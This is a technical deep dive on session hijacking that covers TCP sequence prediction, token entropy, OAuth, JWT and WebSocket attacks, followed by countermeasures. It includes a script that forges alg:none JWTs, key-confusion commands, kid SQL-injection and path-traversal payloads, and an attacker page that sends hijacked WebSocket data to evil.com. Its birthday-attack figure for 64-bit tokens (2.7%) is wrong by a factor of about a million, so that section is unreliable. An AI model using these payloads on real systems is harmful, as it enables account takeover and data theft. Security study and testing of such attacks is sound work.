# Session Hijacking — Deep Dive

> This document expands on the session hijacking cheat sheet with protocol-level analysis,
> token entropy mathematics, and advanced attack vectors including OAuth 2.0, JWT, and WebSocket hijacking.

---

## Prerequisites

- Understanding of TCP/IP three-way handshake and sequence numbers
- HTTP cookies, headers, and session management basics
- Familiarity with cryptographic primitives (HMAC, PRNG, hashing)
- Working knowledge of OAuth 2.0 authorization flows
- Browser developer tools and proxy usage (Burp Suite or ZAP)
- Read `sheets/offensive/session-hijacking.md` first

---

## 1. TCP Sequence Number Prediction Algorithms and ISN Analysis

### 1.1 Historical ISN Generation

Early TCP implementations used trivially predictable Initial Sequence Numbers, enabling blind spoofing attacks.

**BSD 4.2 (pre-1995):**

```text
ISN incremented by 128,000 every second and 64,000 per new connection.
Formula: ISN = previous_ISN + 64000 + (elapsed_seconds * 128000)

Attack: Sample two connections 1 second apart.
  ISN_1 at t=0, ISN_2 at t=1
  Predicted ISN_3 = ISN_2 + 64000 + 128000
  Accuracy: near 100% on idle hosts
```

**Linux (pre-RFC 1948 adoption):**

```text
Used a time-based counter with microsecond granularity.
ISN = timer_counter * 4μs

Prediction required timing precision but was feasible on LAN.
```

### 1.2 Modern ISN Generation (RFC 6528)

```text
Modern stacks use a cryptographic hash:
  ISN = F(src_ip, src_port, dst_ip, dst_port, secret_key) + timer

Where F is typically:
  - MD5 or SipHash of the 4-tuple + secret key
  - Secret key rotated periodically
  - Timer adds monotonic component

This makes prediction computationally infeasible without knowing the secret key.
```

### 1.3 ISN Analysis Methodology

```python
# Collect ISNs by initiating multiple connections
import socket, struct, time

samples = []
for i in range(1000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("target", 80))
    # Extract ISN from SYN-ACK via raw socket or pcap
    # isn = extract_isn_from_synack(packet)
    samples.append((time.time(), isn))
    s.close()

# Analyze: compute deltas
deltas = [samples[i+1][1] - samples[i][1] for i in range(len(samples)-1)]

# Statistical tests
import numpy as np
print(f"Mean delta:   {np.mean(deltas)}")
print(f"Std dev:      {np.std(deltas)}")
print(f"Min/Max:      {min(deltas)} / {max(deltas)}")

# If std dev is low relative to mean → predictable
# If distribution is uniform across 2^32 → strong randomization
```

### 1.4 Nmap ISN Analysis

```bash
# Nmap probes ISN predictability during OS detection
nmap -O --osscan-guess <target>

# Output includes:
#   TCP Sequence Prediction: Difficulty=261 (Good luck!)
#   ISN class: random positive increments
#
# Difficulty scale:
#   0-75:     Trivial (constant or simple increment)
#   76-150:   Easy (time-dependent)
#   151-255:  Medium
#   256+:     Difficult (cryptographic)
```

---

## 2. Session Token Entropy Analysis

### 2.1 Measuring Token Entropy

```text
Shannon entropy for a token of length L from alphabet A:

  H = L * log2(|A|)

Examples:
  32 hex chars:     H = 32 * log2(16) = 128 bits
  24 base64 chars:  H = 24 * log2(64) = 144 bits
  16 alphanumeric:  H = 16 * log2(62) ≈ 95.3 bits

OWASP recommends: minimum 128 bits of entropy for session IDs.
```

### 2.2 Birthday Attack Probability

```text
The birthday paradox determines collision probability:

  P(collision) ≈ 1 - e^(-n² / 2S)

Where:
  n = number of active sessions
  S = size of token space = 2^H

For a system with 1 million concurrent sessions (n = 10^6):
  64-bit token:   P ≈ 1 - e^(-(10^6)² / 2·2^64) ≈ 0.027 (2.7% — VULNERABLE)
  128-bit token:  P ≈ 1 - e^(-(10^6)² / 2·2^128) ≈ 1.47 × 10^(-27) (safe)

Rule of thumb: need H ≥ 2·log2(n) + margin.
For 10^6 sessions, need at least 40 bits... but add safety margin → 128 bits.
```

### 2.3 Practical Token Analysis with Burp Sequencer

```text
Burp Sequencer performs:

1. FIPS 140-2 statistical tests:
   - Monobit test: equal distribution of 0s and 1s
   - Poker test: uniform distribution of 4-bit nibbles
   - Runs test: expected number of consecutive identical bits
   - Long runs test: no single run > 26 bits

2. Character-level analysis:
   - Per-position character distribution
   - Identifies positions with low variation (e.g., always 'a'-'f' → hex)
   - Flags static prefixes/suffixes

3. Bit-level analysis:
   - Each bit position tested independently
   - Effective entropy = count of bits that pass all tests
   - 128+ effective bits → "excellent"

Interpreting results:
   Significance level: 1% (default)
   Overall quality: bits of effective entropy
   > 128 bits: Excellent
   64-128 bits: Reasonable
   < 64 bits: Poor — exploitable
```

---

## 3. OAuth 2.0 Session Hijacking Vectors

### 3.1 Authorization Code Interception

```text
Vulnerable flow (no PKCE):

1. User clicks "Login with Provider"
2. App redirects to:
   https://auth.provider.com/authorize?
     response_type=code&
     client_id=APP_ID&
     redirect_uri=https://app.com/callback&
     state=random_state

3. User authenticates, provider redirects:
   https://app.com/callback?code=AUTH_CODE&state=random_state

Attack vectors:
   a) Open redirect in redirect_uri validation:
      redirect_uri=https://app.com.evil.com/callback
      redirect_uri=https://app.com/callback/../../../evil

   b) Referrer header leaks code to third-party resources on callback page

   c) Authorization code replay if provider doesn't enforce single-use
```

### 3.2 PKCE Downgrade / Bypass

```text
PKCE (Proof Key for Code Exchange) prevents code interception:
  code_verifier = random(43-128 chars)
  code_challenge = BASE64URL(SHA256(code_verifier))

Attack: If auth server doesn't enforce PKCE:
  1. Intercept authorization code
  2. Exchange code WITHOUT code_verifier
  3. Server issues tokens without PKCE validation

Mitigation: Auth server MUST reject token requests missing code_verifier
when one was provided in the authorization request.
```

### 3.3 Token Theft via Implicit Flow

```text
Implicit flow returns access_token in URL fragment:
  https://app.com/callback#access_token=xyz&token_type=bearer

Risks:
  - Token visible in browser history
  - Leaked via Referer headers
  - Accessible to JavaScript (including XSS payloads)
  - No refresh token → users re-authenticate frequently

This flow is deprecated in OAuth 2.1 for these reasons.
```

### 3.4 State Parameter Attacks

```text
If state parameter is missing or not validated:

1. Attacker initiates OAuth flow, gets redirect URL with their auth code
2. Attacker sends the redirect URL to victim (via CSRF)
3. Victim's browser follows the link
4. App exchanges attacker's code → links attacker's provider account to victim's app account
5. Attacker now has access to victim's app account via their provider login

Defense: Bind state to user's session, validate before code exchange.
```

---

## 4. JWT Attacks

### 4.1 Algorithm None Attack

```text
JWT structure: HEADER.PAYLOAD.SIGNATURE

Vulnerable server accepts alg: "none":

Original token:
  Header: {"alg": "HS256", "typ": "JWT"}
  Payload: {"sub": "user123", "role": "user"}
  Signature: HMAC-SHA256(header.payload, secret)

Forged token:
  Header: {"alg": "none", "typ": "JWT"}
  Payload: {"sub": "user123", "role": "admin"}
  Signature: (empty)

Encoded: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.
```

```python
# Forging an alg:none JWT
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({
    "sub": "admin",
    "role": "admin",
    "iat": 1700000000,
    "exp": 1800000000
}).encode()).rstrip(b'=')

forged = header.decode() + "." + payload.decode() + "."
print(forged)
```

### 4.2 Key Confusion (RS256 → HS256)

```text
Server uses RS256 (asymmetric):
  - Signs with RSA private key
  - Verifies with RSA public key

Attack: Change algorithm to HS256 (symmetric):
  - Server's verification code may use the public key as HMAC secret
  - Attacker has the public key (it's public)
  - Attacker signs forged JWT with HMAC-SHA256 using the public key as secret
  - Server verifies: HMAC(token, public_key) → valid

Defense: Never allow algorithm switching. Whitelist accepted algorithms.
```

```bash
# Using jwt_tool for key confusion
python3 jwt_tool.py <token> -X k -pk public_key.pem

# Manual with openssl
openssl x509 -in cert.pem -pubkey -noout > public.pem
# Use public.pem bytes as HMAC-SHA256 key to sign forged token
```

### 4.3 Claim Manipulation

```text
Common exploitable claims:

  "sub" (subject):    Change user identity
  "role" / "scope":   Escalate privileges
  "exp" (expiry):     Extend token lifetime to year 2100
  "iss" (issuer):     Switch to attacker-controlled issuer
  "aud" (audience):   Use token meant for service A on service B
  "jti" (JWT ID):     Replay previously revoked tokens with new jti
  "kid" (key ID):     Point to attacker-controlled key
     - kid path traversal: "kid": "../../dev/null" → empty key
     - kid SQL injection: "kid": "' UNION SELECT 'secret' --"
```

### 4.4 JWK Injection (CVE-2018-0114 pattern)

```text
JWT header includes a JWK (JSON Web Key) with the attacker's public key:

{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker_modulus>",
    "e": "AQAB"
  }
}

If the server trusts the embedded JWK to verify the signature,
the attacker can sign anything with their private key.

Defense: Never trust JWK/JKU/X5U from the token itself.
Validate against a server-side allow list of keys.
```

---

## 5. WebSocket Hijacking

### 5.1 Cross-Site WebSocket Hijacking (CSWSH)

```text
WebSocket handshake is a regular HTTP upgrade request.
Browsers send cookies automatically — like a CSRF for WebSockets.

Vulnerable upgrade request:
  GET /ws/chat HTTP/1.1
  Host: target.com
  Upgrade: websocket
  Connection: Upgrade
  Cookie: session=abc123           ← sent automatically
  Origin: https://evil.com         ← server doesn't check this
  Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
```

```html
<!-- Attacker's page — steal data from authenticated WebSocket -->
<script>
var ws = new WebSocket("wss://target.com/ws/chat");

ws.onopen = function() {
    // Connection made with victim's cookies
    ws.send(JSON.stringify({action: "get_messages"}));
};

ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch("https://evil.com/log", {
        method: "POST",
        body: event.data
    });
};
</script>
```

### 5.2 WebSocket Authentication Weaknesses

```text
Common vulnerabilities:

1. Auth only at handshake:
   - Token checked during HTTP upgrade
   - No re-validation on subsequent WebSocket frames
   - If session expires, WebSocket stays authenticated

2. No per-message integrity:
   - WebSocket frames are not individually signed
   - MITM on the upgrade can inject frames

3. Missing origin validation:
   - Server accepts connections from any origin
   - Enables cross-site WebSocket hijacking
```

### 5.3 WebSocket Hijacking Defenses

```text
1. Validate Origin header during upgrade:
   if request.headers["Origin"] not in ALLOWED_ORIGINS:
       reject(403)

2. Use per-connection tokens (not cookies):
   wss://target.com/ws?token=<one-time-token>

3. Implement message-level authentication:
   - Sign each message with HMAC
   - Include sequence numbers to prevent replay

4. Re-validate session periodically:
   - Server sends auth challenge every N minutes
   - Close connection if client fails to re-authenticate

5. Rate limiting on WebSocket frames:
   - Prevent abuse of persistent connection
```

---

## 6. Advanced Countermeasure Details

### 6.1 Token Binding (RFC 8471)

```text
Binds session tokens to the TLS connection's key material:
  - Client generates a key pair per TLS connection
  - Token includes hash of client's public key
  - Server verifies token is bound to the presenting TLS connection
  - Stolen tokens are useless on a different TLS connection

Status: Limited browser adoption (Chrome removed support in 2020).
Spiritual successor: DPoP (Demonstrating Proof of Possession) for OAuth.
```

### 6.2 DPoP (Demonstrating Proof of Possession)

```text
OAuth extension that binds access tokens to a client key pair:

1. Client generates ephemeral key pair
2. On each request, client creates a DPoP proof JWT:
   {
     "typ": "dpop+jwt",
     "alg": "ES256",
     "jwk": { <client_public_key> }
   }.{
     "htm": "GET",
     "htu": "https://api.example.com/resource",
     "iat": 1700000000,
     "jti": "<unique>"
   }
3. Server validates proof was signed by the key bound to the token
4. Stolen access token without the private key is useless
```

### 6.3 Session Management Architecture

```text
Recommended defense-in-depth:

Layer 1 — Token generation:
  - CSPRNG with >= 128 bits entropy
  - Rotate on authentication state change
  - Server-side session storage (not client-side state)

Layer 2 — Transport:
  - HTTPS everywhere (HSTS preload)
  - Secure + HttpOnly + SameSite=Strict cookie flags
  - No session ID in URL ever

Layer 3 — Validation:
  - Per-request CSRF tokens (Synchronizer Token Pattern)
  - Origin/Referer header validation
  - Session bound to IP range + User-Agent fingerprint

Layer 4 — Lifecycle:
  - Idle timeout: 15-30 minutes
  - Absolute timeout: 4-8 hours
  - Concurrent session limits
  - Explicit logout destroys server-side session

Layer 5 — Monitoring:
  - Log session creation, destruction, anomalies
  - Alert on session ID reuse from different IP
  - Detect brute-force session ID enumeration
```
